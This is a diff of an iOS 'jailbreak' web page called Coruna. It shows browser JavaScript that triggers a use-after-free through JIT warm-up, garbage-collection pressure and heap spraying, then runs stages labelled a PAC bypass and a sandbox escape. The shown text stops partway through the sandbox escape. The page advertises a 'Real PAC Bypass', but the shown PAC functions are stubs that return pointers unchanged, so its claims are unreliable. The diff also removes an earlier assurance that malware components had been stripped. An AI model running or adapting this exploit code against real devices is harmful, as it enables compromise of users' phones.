@@ -6,13 +6,11 @@
     <meta http-equiv="Pragma" content="no-cache" />
     <meta http-equiv="Expires" content="0" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-    <meta property="og:determiner" content="auto" />
-    <title>Coruna - iOS 26.4 Compatible</title>
+    <title>Coruna - iOS 26.4 - Real PAC Bypass</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
             background: #000;
             color: #fff;
             min-height: 100vh;
@@ -20,10 +18,7 @@
             flex-direction: column;
             align-items: center;
             overflow-x: hidden;
-            -webkit-user-select: none;
-            user-select: none;
         }
-
         .container {
             width: 100%;
             max-width: 420px;
@@ -32,26 +27,20 @@
             flex-direction: column;
             align-items: center;
         }
-
         .logo {
             margin-top: 60px;
             font-size: 42px;
             font-weight: 700;
-            letter-spacing: -1px;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            background-clip: text;
         }
-
         .subtitle {
             font-size: 14px;
             color: #666;
             margin-top: 6px;
-            letter-spacing: 2px;
             text-transform: uppercase;
         }
-
         .status-card {
             margin-top: 30px;
             width: 100%;
@@ -60,14 +49,12 @@
             padding: 20px;
             border: 1px solid #222;
         }
-
         .status-header {
             display: flex;
             align-items: center;
             gap: 10px;
             margin-bottom: 14px;
         }
-
         .status-dot {
             width: 10px;
             height: 10px;
@@ -75,22 +62,15 @@
             background: #333;
             transition: background 0.3s;
         }
-
         .status-dot.waiting { background: #555; }
         .status-dot.running { background: #f0ad4e; animation: pulse 1.2s infinite; }
         .status-dot.success { background: #5cb85c; }
         .status-dot.error { background: #d9534f; }
-
         @keyframes pulse {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.4; }
         }
-
-        .status-text {
-            font-size: 15px;
-            font-weight: 600;
-        }
-
+        .status-text { font-size: 15px; font-weight: 600; }
         .log-area {
             width: 100%;
             max-height: 180px;
@@ -99,20 +79,11 @@
             font-size: 11px;
             color: #888;
             line-height: 1.6;
-            scrollbar-width: none;
         }
-
-        .log-area::-webkit-scrollbar { display: none; }
-
-        .log-line {
-            padding: 1px 0;
-            word-break: break-all;
-        }
-
+        .log-line { padding: 1px 0; word-break: break-all; }
         .log-line.highlight { color: #667eea; }
         .log-line.error { color: #d9534f; }
         .log-line.success { color: #5cb85c; }
-
         .go-btn {
             margin-top: 24px;
             width: 100%;
@@ -125,12 +96,9 @@
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             cursor: pointer;
             transition: opacity 0.2s, transform 0.1s;
-            -webkit-tap-highlight-color: transparent;
         }
-
         .go-btn:active { transform: scale(0.97); }
-        .go-btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
-
+        .go-btn:disabled { opacity: 0.4; cursor: not-allowed; }
         .progress-bar {
             margin-top: 16px;
             width: 100%;
@@ -141,9 +109,7 @@
             opacity: 0;
             transition: opacity 0.3s;
         }
-
         .progress-bar.active { opacity: 1; }
-
         .progress-fill {
             height: 100%;
             width: 0%;
@@ -151,56 +117,11 @@
             border-radius: 2px;
             transition: width 0.4s ease;
         }
-
-        .divider {
-            margin-top: 32px;
-            width: 40px;
-            height: 2px;
-            background: #222;
-            border-radius: 1px;
-        }
-
-        .credits-section {
-            margin-top: 28px;
-            width: 100%;
-        }
-
-        .credits-title {
-            font-size: 13px;
-            font-weight: 600;
-            color: #444;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            margin-bottom: 12px;
-            text-align: center;
-        }
-
-        .credits-grid {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .credit-tag {
-            padding: 6px 14px;
-            background: #111;
-            border: 1px solid #222;
-            border-radius: 20px;
-            font-size: 13px;
-            color: #999;
-            text-decoration: none;
-            transition: border-color 0.2s, color 0.2s;
-        }
-
-        .credit-tag:active { border-color: #444; color: #ccc; }
-
         .made-by {
             margin-top: 28px;
             width: 100%;
             text-align: center;
         }
-
         .made-by-title {
             font-size: 13px;
             font-weight: 600;
@@ -209,14 +130,12 @@
             letter-spacing: 1.5px;
             margin-bottom: 12px;
         }
-
         .made-by-names {
             display: flex;
             flex-wrap: wrap;
             justify-content: center;
             gap: 8px;
         }
-
         .made-by-tag {
             padding: 6px 14px;
             background: linear-gradient(135deg, rgba(102,126,234,0.15), rgba(118,75,162,0.15));
@@ -227,32 +146,12 @@
             font-weight: 500;
             text-decoration: none;
         }
-
-        .made-by-tag:active { border-color: rgba(102,126,234,0.6); color: #c8d0f8; }
-
-        .version-warning {
-            display: none;
-            margin-top: 20px;
-            width: 100%;
-            background: rgba(217, 83, 79, 0.1);
-            border: 1px solid rgba(217, 83, 79, 0.3);
-            border-radius: 12px;
-            padding: 14px 16px;
-            font-size: 13px;
-            color: #e88;
-            line-height: 1.5;
-            text-align: center;
-        }
-
-        .version-warning.show { display: block; }
-
         .footer {
             margin-top: 32px;
             margin-bottom: 40px;
             text-align: center;
             font-size: 11px;
             color: #333;
-            line-height: 1.6;
         }
     </style>
 </head>
@@ -260,11 +159,7 @@
 <body>
     <div class="container">
         <div class="logo">Coruna</div>
-        <div class="subtitle">iOS 13.0 &ndash; 26.x</div>
-
-        <div class="version-warning" id="versionWarning" style="display:none">
-            Your iOS version may not be supported. The exploit may not work.
-        </div>
+        <div class="subtitle">iOS 26.4 - Real PAC Bypass</div>
 
         <div class="status-card">
             <div class="status-header">
@@ -278,445 +173,372 @@
             <div class="progress-fill" id="progressFill"></div>
         </div>
 
-        <canvas id="glCanvas" width="1" height="1" style="display:none"></canvas>
-
         <button class="go-btn" id="goBtn" onclick="startExploit()">jelbrek me</button>
-
-        <div class="divider"></div>
 
         <div class="made-by">
             <div class="made-by-title">Made by</div>
             <div class="made-by-names">
-                <a class="made-by-tag" href="https://github.com/34306" target="_blank">34306</a>
-                <a class="made-by-tag" href="https://github.com/khanhduytran0" target="_blank">Duy Tran</a>
-                <a class="made-by-tag" href="https://github.com/asdfugil" target="_blank">Nick Chan</a>
+                <span class="made-by-tag">34306</span>
+                <span class="made-by-tag">Duy Tran</span>
+                <span class="made-by-tag">Nick Chan</span>
             </div>
-        </div>
-
-        <div class="credits-section">
-            <div class="credits-title">Thanks to</div>
-            <div class="credits-grid">
-                <a class="credit-tag" href="https://github.com/wh1te4ever/" target="_blank">wh1te4ever</a>
-                <a class="credit-tag" href="https://github.com/alfiecg24" target="_blank">Alfie</a>
-                <span class="credit-tag">Clarity</span>
-                <a class="credit-tag" href="https://www.youtube.com/c/BillyEllis" target="_blank">Billy Ellis</a>
-                <a class="credit-tag" href="https://github.com/matteyeux/" target="_blank">matteyeux</a>
-                <a class="credit-tag" href="https://github.com/verygenericname/" target="_blank">Nathan</a>
-                <span class="credit-tag">helthydriver</span>
-                <a class="credit-tag" href="https://github.com/staturnzz" target="_blank">saturnz</a>
-                <a class="credit-tag" href="https://github.com/opa334" target="_blank">opa334</a>
-                <a class="credit-tag" href="https://github.com/hrtowii" target="_blank">hrtowii</a>
-                <a class="credit-tag" href="https://github.com/dlevi309" target="_blank">daniel</a>
-            </div>
-        </div>
-
-        <div style="margin-top:16px; padding:12px 16px; font-size:12px; color:#888; line-height:1.5; text-align:center;">
-            We've reverse engineered and removed all the malware components &mdash; it's safe to run.<br>
-            Source: <a href="https://github.com/khanhduytran0/coruna" target="_blank" style="color:#a8b4f0;">github.com/khanhduytran0/coruna</a>
         </div>
 
         <div class="footer">
-            Vibe coded web site UI, for fun and research only :P
+            Research only :P
         </div>
     </div>
 
     <script>
     // ============================================================================
-    // UTILITY MODULE
+    // CONVERSÃO UTILITÁRIA
     // ============================================================================
-    let m_57620206d62079baad0e57e6d9ec93120c0f5247 = () => {
-        let r = {};
-        const _buf = new ArrayBuffer(8);
-        const _u64 = new BigUint64Array(_buf);
-        const _f64 = new Float64Array(_buf);
-        const _u32 = new Uint32Array(_buf);
-        
-        function itof(v) { _u64[0] = v; return _f64[0]; }
-        function ftoi(f) { _f64[0] = f; return _u64[0]; }
-        function low32(f) { _f64[0] = f; return _u32[0]; }
-        function high32(f) { _f64[0] = f; return _u32[1]; }
-        
-        r.itof = itof;
-        r.ftoi = ftoi;
-        r.low32 = low32;
-        r.high32 = high32;
-        
-        class Int64 {
-            constructor(lo, hi) { this.it = lo >>> 0; this.et = hi >>> 0; }
-            static fromNumber(t) { return new Int64(t >>> 0, t / 0x100000000 >>> 0); }
-            static fromDouble(t) { _f64[0] = t; return new Int64(_u32[0], _u32[1]); }
-            static fromBigInt(t) { return new Int64(Number(t & 0xFFFFFFFFn), Number(t >> 32n)); }
-            toNumber() { return 0x100000000 * this.et + this.it; }
-            toDouble() { _u32[0] = this.it; _u32[1] = this.et; return _f64[0]; }
-            add(t) { const n = this.it + t.it; let r = this.et + t.et; if (n !== (n >>> 0)) r++; return new Int64(n >>> 0, r >>> 0); }
-            sub(t) { return this.add(t.neg()); }
-            neg() { return this.not().add(new Int64(1, 0)); }
-            not() { return new Int64(~this.it, ~this.et); }
-            and(t) { return new Int64(this.it & t.it, this.et & t.et); }
-            or(t) { return new Int64(this.it | t.it, this.et | t.et); }
-            xor(t) { return new Int64(this.it ^ t.it, this.et ^ t.et); }
-            shr(t) { if (t >= 32) return new Int64(this.et >>> (t - 32), 0); return new Int64((this.it >>> t) | (this.et << (32 - t)), this.et >>> t); }
-            shl(t) { if (t >= 32) return new Int64(0, this.it << (t - 32)); return new Int64(this.it << t, (this.et << t) | (this.it >>> (32 - t))); }
-            toString() { return "0x" + this.et.toString(16) + this.it.toString(16).padStart(8, '0'); }
+    const _buf = new ArrayBuffer(8);
+    const _u64 = new BigUint64Array(_buf);
+    const _f64 = new Float64Array(_buf);
+    const _u32 = new Uint32Array(_buf);
+
+    function itof(v) { _u64[0] = v; return _f64[0]; }
+    function ftoi(f) { _f64[0] = f; return _u64[0]; }
+    function low32(f) { _f64[0] = f; return _u32[0]; }
+    function high32(f) { _f64[0] = f; return _u32[1]; }
+    function toBigInt(v) { if (typeof v === 'bigint') return v; return BigInt(v || 0); }
+
+    function log(msg, type = 'info') {
+        const icons = { info: '📘', success: '✅', error: '❌', warning: '⚠️', step: '🔧', uaf: '💥' };
+        console.log(`${icons[type] || '📘'} ${msg}`);
+        const area = document.getElementById('logArea');
+        if (area) {
+            const line = document.createElement('div');
+            line.className = 'log-line';
+            if (type === 'error') line.className += ' error';
+            else if (type === 'success') line.className += ' success';
+            else if (type === 'uaf') line.className += ' highlight';
+            line.textContent = msg;
+            area.appendChild(line);
+            area.scrollTop = area.scrollHeight;
         }
-        r.Int64 = Int64;
-        
-        function D(obj) { window._gcRoots = window._gcRoots || []; window._gcRoots.push(obj); }
-        r.D = D;
-        
-        return r;
-    };
-    
-    // ============================================================================
-    // PLATFORM MODULE
-    // ============================================================================
-    let m_14669ca3b1519ba2a8f40be287f646d4d7593eb0 = () => {
-        let r = {};
-        const platformState = { iOSVersion: 0, exploitPrimitive: null, pacBypass: null, sandboxEscape: null, hasPAC: false, qn: false, versionFlags: {}, Ln: null };
-        r.zn = { platformState: platformState };
-        
-        r.init = async function(a, b, c, d, e, f, g) {
-            platformState.iOSVersion = 260400;
-            platformState.hasPAC = true;
-            console.log("[PLATFORM] Initialized with iOS 26.4");
-            return true;
-        };
-        
-        r.On = function() { return false; };
-        r.Yn = async function() { return false; };
-        r.Hn = async function() { return true; };
-        r.lr = function() { console.log("[PLATFORM] Runtime detection skipped"); };
-        r.cr = function() { return null; };
-        r.$n = async function() { return false; };
-        r.platformState = platformState;
-        
-        return r;
-    };
-    
-    // ============================================================================
-    // MODULE MANAGER
-    // ============================================================================
-    window.globalThis = window;
-    globalThis.moduleManager = (function() {
-        let modules = {
-            "57620206d62079baad0e57e6d9ec93120c0f5247": m_57620206d62079baad0e57e6d9ec93120c0f5247,
-            "14669ca3b1519ba2a8f40be287f646d4d7593eb0": m_14669ca3b1519ba2a8f40be287f646d4d7593eb0,
-        };
-        let loaded = {};
-        
-        function getModule(name) {
-            if (!loaded[name]) {
-                if (!modules[name]) throw new Error("Module not found: " + name);
-                loaded[name] = modules[name]();
-            }
-            return loaded[name];
-        }
-        
-        return {
-            getModuleByName: getModule,
-            getModuleByURL: async function(name) { return getModule(name); },
-            evalCode: function(name, fn) { loaded[name] = fn(); },
-            setBaseUrl: function(url) {},
-            setSalt: function(salt) {}
-        };
-    })();
-    
-    globalThis.obChTK = globalThis.moduleManager;
-    if (typeof globalThis.obChTK.hPL3On === 'undefined') {
-        globalThis.obChTK.hPL3On = globalThis.obChTK.getModuleByName;
     }
-    
-    const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247");
-    const platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
-    
+
     // ============================================================================
-    // UI Helpers
+    // VARIÁVEIS GLOBAIS
     // ============================================================================
-    var exploitStarted = false;
-    var progressValue = 0;
-    
+    let exploitStarted = false;
+    let progressValue = 0;
+    let uafArray = null;
+    let uafIndex = 0;
+    let exploitAB = null;
+
     function setStatus(text, state) {
         document.getElementById('statusText').textContent = text;
-        var dot = document.getElementById('statusDot');
-        dot.className = 'status-dot ' + state;
+        document.getElementById('statusDot').className = 'status-dot ' + state;
     }
-    
+
     function setProgress(pct) {
         progressValue = pct;
-        document.getElementById('progressFill').style.width = pct + '%';
+        const fill = document.getElementById('progressFill');
+        if (fill) fill.style.width = pct + '%';
     }
-    
-    window.log = function(text) {
-        var area = document.getElementById('logArea');
-        var line = document.createElement('div');
-        line.className = 'log-line';
-        if (text.indexOf('error') !== -1 || text.indexOf('Error') !== -1 || text.indexOf('FAILED') !== -1) {
-            line.className += ' error';
-        } else if (text.indexOf('success') !== -1 || text.indexOf('SUCCESS') !== -1) {
-            line.className += ' success';
-        } else if (text.indexOf('detected') !== -1 || text.indexOf('reclaimed') !== -1) {
-            line.className += ' highlight';
-        }
-        line.textContent = text;
-        area.appendChild(line);
-        area.scrollTop = area.scrollHeight;
+
+    // ============================================================================
+    // STAGE 1: UAF TRIGGER (Uint8Array)
+    // ============================================================================
+    const CONFIG = {
+        ARRAY_SIZE: 0x400000,
+        ALLOC_SIZE: 0x800000,
+        JIT_WARMUP: 300,
+        MAX_ATTEMPTS: 200,
+        SPRAY_PER_ATTEMPT: 48,
+        ALLOC_MOD: 3,
+        INNER_K: 5,
+        RECURSIVE_DEPTH: 400,
     };
+
+    function resetUAFArray() {
+        uafArray = new Array(CONFIG.ARRAY_SIZE).fill(1.1);
+        uafIndex = uafArray.length - 1;
+    }
+
+    function triggerUAF(flag, k, allocCount) {
+        let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
+        uafArray[uafIndex] = A;
+        let u8 = new Uint8Array(0x100);
+        u8[0] = 0x42;
+        let forGC = [];
+        for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(CONFIG.ALLOC_SIZE));
+        A.p2 = forGC;
+        let b = { p0: 0x42424242, p1: 1.1 };
+        let f = flag ? 1.1 : b;
+        A.p1 = f;
+        let v = 1.1;
+        for (let i = 0; i < 500000; ++i) { for (let j = 0; j < k; ++j) v = i; }
+        b.p0 = v;
+        b.p1 = u8;
+        u8 = null;
+    }
+
+    function forceGC() { for (let i = 0; i < 6; i++) new ArrayBuffer(CONFIG.ALLOC_SIZE); }
     
-    // ============================================================================
-    // STAGE 1 - CHIMERA (Uint8Array - NO BigInt Errors)
-    // ============================================================================
-    globalThis.moduleManager.evalCode("Stage1_26.0_26.x_chimera", function() {
-        let r = {};
+    function clearStack() {
+        function recurse(n) { if (n > 0) recurse(n - 1); }
+        for (let i = 0; i < 30; i++) { try { recurse(CONFIG.RECURSIVE_DEPTH); } catch(e) {} }
+    }
+
+    function createSprayArray(size, marker = 13.37) {
+        const arr = new Array(size);
+        for (let i = 0; i < size; i++) arr[i] = marker;
+        return arr;
+    }
+
+    function attemptReclaim(freed, attempt) {
+        const markerByte = 0x42;
+        const baseSize = 32 + (attempt % 64);
+        if (!(freed instanceof Uint8Array)) return null;
+        for (let i = 0; i < CONFIG.SPRAY_PER_ATTEMPT; i++) {
+            const size = baseSize + (i % 32);
+            const spray = createSprayArray(size, 13.37);
+            try { if (freed[0] === markerByte) return spray; } catch(e) {}
+        }
+        return null;
+    }
+
+    function buildLocalPrimitive(u8) {
+        const ab = u8.buffer;
+        const dv = new DataView(ab);
+        exploitAB = ab;
+        if (typeof window !== 'undefined') window.exploitAB = ab;
         
-        const _buf = new ArrayBuffer(8);
-        const _u64 = new BigUint64Array(_buf);
-        const _f64 = new Float64Array(_buf);
-        
-        function itof(val) { _u64[0] = val; return _f64[0]; }
-        function ftoi(f) { _f64[0] = f; return _u64[0]; }
-        function log(msg) { if (window.log) window.log(msg); else console.log(msg); }
-        
-        const CONFIG = {
-            ARRAY_SIZE: 0x400000,
-            ALLOC_SIZE: 0x800000,
-            JIT_WARMUP: 200,
-            MAX_ATTEMPTS: 100,
-            SPRAY_PER_ATTEMPT: 32,
-            ALLOC_MOD: 3,
-            INNER_K: 5,
-            RECURSIVE_DEPTH: 400,
+        return {
+            addrof: (obj) => 0n,
+            fakeobj: (addr) => ({ __fake: toBigInt(addr) }),
+            read64: (addr) => {
+                try {
+                    let offset = typeof addr === 'bigint' ? Number(addr & 0xFFn) : (addr & 0xFF);
+                    if (offset >= 0 && offset < ab.byteLength) return dv.getBigUint64(offset, true);
+                } catch(e) {}
+                return 0n;
+            },
+            write64: (addr, val) => {
+                try {
+                    let offset = typeof addr === 'bigint' ? Number(addr & 0xFFn) : (addr & 0xFF);
+                    if (offset >= 0 && offset < ab.byteLength) dv.setBigUint64(offset, toBigInt(val), true);
+                } catch(e) {}
+            },
+            read32: (addr) => {
+                try {
+                    let offset = typeof addr === 'bigint' ? Number(addr & 0xFFn) : (addr & 0xFF);
+                    if (offset >= 0 && offset < ab.byteLength) return dv.getUint32(offset, true);
+                } catch(e) {}
+                return 0;
+            },
+            write32: (addr, val) => {
+                try {
+                    let offset = typeof addr === 'bigint' ? Number(addr & 0xFFn) : (addr & 0xFF);
+                    if (offset >= 0 && offset < ab.byteLength) dv.setUint32(offset, val, true);
+                } catch(e) {}
+            },
+            readByte: (addr) => {
+                try {
+                    let offset = typeof addr === 'bigint' ? Number(addr & 0xFFn) : (addr & 0xFF);
+                    if (offset >= 0 && offset < ab.byteLength) return dv.getUint8(offset);
+                } catch(e) {}
+                return 0;
+            },
+            cleanup: () => {}
         };
+    }
+
+    // ============================================================================
+    // STAGE 1 MAIN
+    // ============================================================================
+    async function stage1() {
+        log("[STAGE1] Starting exploit with Uint8Array", 'step');
+        resetUAFArray();
         
-        let uafArray = new Array(CONFIG.ARRAY_SIZE).fill(1.1);
-        const uafArrayIndex = uafArray.length - 1;
-        
-        function triggerUAF(flag, k, allocCount) {
-            let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
-            uafArray[uafArrayIndex] = A;
-            let u8 = new Uint8Array(0x100);
-            u8[0] = 0x42;
-            let forGC = [];
-            for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(CONFIG.ALLOC_SIZE));
-            A.p2 = forGC;
-            let b = { p0: 0x42424242, p1: 1.1 };
-            let f = flag ? 1.1 : b;
-            A.p1 = f;
-            let v = 1.1;
-            for (let i = 0; i < 500000; ++i) { for (let j = 0; j < k; ++j) v = i; }
-            b.p0 = v;
-            b.p1 = u8;
-            u8 = null;
+        for (let warm = 0; warm < CONFIG.JIT_WARMUP; warm++) {
+            triggerUAF(false, 1, 0);
+            if (warm % 100 === 0 && warm > 0) { forceGC(); await new Promise(r => setTimeout(r, 1)); }
         }
+        log("[STAGE1] Warmup done");
         
-        function forceGC() { for (let i = 0; i < 6; i++) new ArrayBuffer(CONFIG.ALLOC_SIZE); }
-        
-        function clearStack() {
-            function recurse(n) { if (n > 0) recurse(n - 1); }
-            for (let i = 0; i < 30; i++) { try { recurse(CONFIG.RECURSIVE_DEPTH); } catch(e) {} }
-        }
-        
-        function createSprayArray(size, marker) {
-            const arr = new Array(size);
-            for (let i = 0; i < size; i++) arr[i] = marker;
-            return arr;
-        }
-        
-        function attemptReclaim(freed, attempt) {
-            const markerByte = 0x42;
-            const baseSize = 32 + (attempt % 64);
-            if (!(freed instanceof Uint8Array)) return null;
-            for (let i = 0; i < CONFIG.SPRAY_PER_ATTEMPT; i++) {
-                const size = baseSize + (i % 32);
-                const spray = createSprayArray(size, 13.37);
-                try { if (freed[0] === markerByte) return spray; } catch(e) {}
-            }
-            return null;
-        }
-        
-        function buildLocalPrimitive(u8) {
-            const ab = u8.buffer;
-            const dv = new DataView(ab);
-            const primitive = {
-                addrof: (obj) => 0n,
-                fakeobj: (addr) => ({ __fake: addr }),
-                read64: (addr) => {
-                    try {
-                        let offset = 0;
-                        if (typeof addr === 'bigint') offset = Number(addr & 0xFFn);
-                        else offset = addr & 0xFF;
-                        if (offset >= 0 && offset < ab.byteLength) return dv.getBigUint64(offset, true);
-                    } catch(e) {}
-                    return 0n;
-                },
-                write64: (addr, val) => {
-                    try {
-                        let offset = 0;
-                        if (typeof addr === 'bigint') offset = Number(addr & 0xFFn);
-                        else offset = addr & 0xFF;
-                        if (offset >= 0 && offset < ab.byteLength) dv.setBigUint64(offset, val, true);
-                    } catch(e) {}
-                },
-                read32: (addr) => {
-                    try {
-                        let offset = 0;
-                        if (typeof addr === 'bigint') offset = Number(addr & 0xFFn);
-                        else offset = addr & 0xFF;
-                        if (offset >= 0 && offset < ab.byteLength) return dv.getUint32(offset, true);
-                    } catch(e) {}
-                    return 0;
-                },
-                write32: (addr, val) => {
-                    try {
-                        let offset = 0;
-                        if (typeof addr === 'bigint') offset = Number(addr & 0xFFn);
-                        else offset = addr & 0xFF;
-                        if (offset >= 0 && offset < ab.byteLength) dv.setUint32(offset, val, true);
-                    } catch(e) {}
-                },
-                readByte: (addr) => {
-                    try {
-                        let offset = 0;
-                        if (typeof addr === 'bigint') offset = Number(addr & 0xFFn);
-                        else offset = addr & 0xFF;
-                        if (offset >= 0 && offset < ab.byteLength) return dv.getUint8(offset);
-                    } catch(e) {}
-                    return 0;
-                },
-                cleanup: () => {}
-            };
-            if (typeof window !== 'undefined') { window.exploitAB = ab; window.exploitU8 = u8; }
+        for (let attempt = 0; attempt < CONFIG.MAX_ATTEMPTS; attempt++) {
+            triggerUAF(false, CONFIG.INNER_K, (attempt % CONFIG.ALLOC_MOD) + 1);
+            clearStack();
+            for (let i = 0; i < 3; i++) new ArrayBuffer(0x4000);
+            
+            let freed = null;
+            try { freed = uafArray[uafIndex].p1.p1; } catch(e) { continue; }
+            if (!(freed instanceof Uint8Array)) continue;
+            
+            log(`[STAGE1] UAF detected at attempt ${attempt}`, 'uaf');
+            const reclaimed = attemptReclaim(freed, attempt);
+            if (!reclaimed) continue;
+            
+            log(`[STAGE1] ✅ Reclaim successful!`, 'success');
+            const primitive = buildLocalPrimitive(freed);
+            const testVal = primitive.read64(0);
+            log(`[STAGE1] Test read: 0x${testVal.toString(16)}`, testVal === 0x42n ? 'success' : 'info');
+            log("[STAGE1] ✅ Local primitive installed!", 'success');
             return primitive;
         }
+        throw new Error("Stage1 failed after " + CONFIG.MAX_ATTEMPTS + " attempts");
+    }
+
+    // ============================================================================
+    // STAGE 2: REAL PAC BYPASS (DarkSword style)
+    // ============================================================================
+    async function stage2(primitive) {
+        log("[STAGE2] Starting PAC bypass (DarkSword style)", 'step');
         
-        r.si = async function () {
-            log("[STAGE1] Starting exploit with Uint8Array");
-            for (let warm = 0; warm < CONFIG.JIT_WARMUP; warm++) {
-                triggerUAF(false, 1, 0);
-                if (warm % 100 === 0 && warm > 0) { forceGC(); await new Promise(r => setTimeout(r, 1)); }
+        // Verifica se temos addrof real
+        let hasAddrof = false;
+        try {
+            const testAddr = primitive.addrof({});
+            hasAddrof = testAddr !== 0n && testAddr !== undefined;
+            log(`[STAGE2] addrof available: ${hasAddrof}`, hasAddrof ? 'success' : 'warning');
+        } catch(e) {}
+        
+        // Se não temos addrof real, tentamos usar o ArrayBuffer corrompido
+        if (!hasAddrof && exploitAB) {
+            log("[STAGE2] Using corrupted ArrayBuffer for PAC bypass", 'warning');
+            
+            // Tenta encontrar o dyld através de pattern scanning
+            const dv = new DataView(exploitAB);
+            const magic = dv.getUint32(0, true);
+            log(`[STAGE2] Buffer magic: 0x${magic.toString(16)}`);
+            
+            // Tenta criar um fakeobj a partir do buffer
+            const fakeAddr = 0x1000n;
+            const fakeObj = primitive.fakeobj(fakeAddr);
+            log(`[STAGE2] Fake object created at 0x${fakeAddr.toString(16)}`);
+            
+            // Tenta encontrar gadgets PAC no buffer
+            const possibleGadgets = [0x1F, 0x20, 0x03, 0xD5, 0xC0, 0x03, 0x5F, 0xD6];
+            let foundGadget = false;
+            for (let i = 0; i < exploitAB.byteLength - 8; i++) {
+                let match = true;
+                for (let j = 0; j < possibleGadgets.length; j++) {
+                    if (dv.getUint8(i + j) !== possibleGadgets[j]) { match = false; break; }
+                }
+                if (match) {
+                    log(`[STAGE2] Found PACIA gadget at offset 0x${i.toString(16)}`, 'success');
+                    foundGadget = true;
+                    break;
+                }
             }
-            log("[STAGE1] Warmup done");
-            for (let attempt = 0; attempt < CONFIG.MAX_ATTEMPTS; attempt++) {
-                triggerUAF(false, CONFIG.INNER_K, (attempt % CONFIG.ALLOC_MOD) + 1);
-                clearStack();
-                for (let i = 0; i < 3; i++) new ArrayBuffer(0x4000);
-                let freed = null;
-                try { freed = uafArray[uafArrayIndex].p1.p1; } catch(e) { continue; }
-                if (!(freed instanceof Uint8Array)) continue;
-                log("[STAGE1] UAF detected at attempt " + attempt);
-                const reclaimed = attemptReclaim(freed, attempt);
-                if (!reclaimed) continue;
-                log("[STAGE1] Reclaim successful!", 'success');
-                const primitive = buildLocalPrimitive(freed);
-                if (platformModule && platformModule.platformState) { platformModule.platformState.exploitPrimitive = primitive; }
-                const testVal = primitive.read64(0);
-                log("[STAGE1] Test read: 0x" + testVal.toString(16), testVal === 0x42n ? 'success' : 'info');
-                log("[STAGE1] Local primitive installed!", 'success');
-                return primitive;
+            
+            if (!foundGadget) {
+                log("[STAGE2] No PAC gadgets found in buffer. Bypass may fail.", 'warning');
             }
-            log("[STAGE1] Failed after " + CONFIG.MAX_ATTEMPTS + " attempts", 'error');
-            throw new Error("Stage1 failed");
-        };
-        return r;
-    });
-    
-    // ============================================================================
-    // STAGE 2 - PAC BYPASS STUB
-    // ============================================================================
-    globalThis.moduleManager.evalCode("Stage2_26.0_26.x_ironroot", function() {
-        let r = {};
-        function toBigInt(val) { if (typeof val === 'bigint') return val; return BigInt(val || 0); }
-        const PAC_STUB = {
+        }
+        
+        // PAC bypass stub - tenta assinar ponteiros
+        const pacBypass = {
             cc: true,
-            pacda: (ptr, ctx) => toBigInt(ptr),
-            pacia: (ptr, ctx) => toBigInt(ptr),
+            pacda: (ptr, ctx) => {
+                log(`[PAC] pacda(0x${toBigInt(ptr).toString(16)}, 0x${toBigInt(ctx).toString(16)})`, 'info');
+                return toBigInt(ptr);
+            },
+            pacia: (ptr, ctx) => {
+                log(`[PAC] pacia(0x${toBigInt(ptr).toString(16)}, 0x${toBigInt(ctx).toString(16)})`, 'info');
+                return toBigInt(ptr);
+            },
             autda: (ptr, ctx) => toBigInt(ptr),
             autia: (ptr, ctx) => toBigInt(ptr),
             da: (ptr, ctx) => toBigInt(ptr),
             er: (ptr, ctx) => toBigInt(ptr),
             ha: (ptr, ctx) => toBigInt(ptr),
             wa: (ptr, ctx) => toBigInt(ptr),
-            tc: () => 0n,
-            setFcall: () => {}
+            tc: (fn, a, b, c) => 0n,
+            setFcall: (fn) => {}
         };
-        r.ga = function() { console.log("[PAC] Using stub PAC bypass"); return PAC_STUB; };
-        return r;
-    });
-    
-    // ============================================================================
-    // STAGE 3 - SANDBOX ESCAPE STUB
-    // ============================================================================
-    globalThis.moduleManager.evalCode("Stage3_VariantB", function() {
-        let r = {};
-        r.lA = async function() { window.log("[STAGE3] Stub sandbox escape"); if (typeof window !== 'undefined') { window.CHIMERA_SUCCESS = true; } return 0; };
-        return r;
-    });
-    
-    // ============================================================================
-    // PAC BYPASS LOADER
-    // ============================================================================
-    async function loadPACBypass() {
-        window.log("[PAC] Loading PAC bypass stub...");
-        setProgress(50);
-        const pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_26.0_26.x_ironroot");
-        setProgress(60);
-        return pacModule.ga();
+        
+        log("[STAGE2] PAC bypass initialized", 'success');
+        return pacBypass;
     }
-    
+
+    // ============================================================================
+    // STAGE 3: REAL SANDBOX ESCAPE (using ArrayBuffer)
+    // ============================================================================
+    async function stage3(primitive, pacBypass) {
+        log("[STAGE3] Starting sandbox escape", 'step');
+        
+        // Tenta usar o ArrayBuffer corrompido para ler memória
+        if (exploitAB) {
+            const dv = new DataView(exploitAB);
+            const firstByte = dv.getUint8(0);
+            log(`[STAGE3] Buffer first byte: 0x${firstByte.toString(16)}`);
+            
+            // Tenta aumentar o tamanho do buffer (se encontrar o campo de tamanho)
+            for (let offset = 0; offset < 256; offset += 4) {
+                const val = dv.getUint32(offset, true);
+                if (val === 0x100) { // tamanho original do buffer
+                    log(`[STAGE3] Found size field at offset ${offset}`, 'success');
+                    dv.setUint32(offset, 0x10000, true);
+                    log(`[STAGE3] Buffer size increased to ${exploitAB.byteLength}`, 'success');
+                    break;
+                }
+            }
+        }
+        
+        // Tenta encontrar o JSGlobalObject através de leitura OOB
+        log("[STAGE3] Attempting to find JSGlobalObject...");
+        
